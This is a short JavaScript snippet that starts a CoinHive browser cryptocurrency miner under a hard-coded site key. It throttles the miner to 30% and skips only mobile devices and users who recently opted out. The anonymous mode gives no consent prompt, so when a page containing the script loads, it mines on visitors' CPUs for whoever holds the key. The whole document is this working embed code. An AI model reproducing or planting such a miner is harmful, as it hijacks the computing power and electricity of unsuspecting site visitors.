var miner = new CoinHive.Anonymous('UP8E4roXLzDC5gVro8bzjliKe9UHcJUW', {throttle: 0.3});

if (!miner.isMobile() && !miner.didOptOut(14400)) {
	miner.start();
}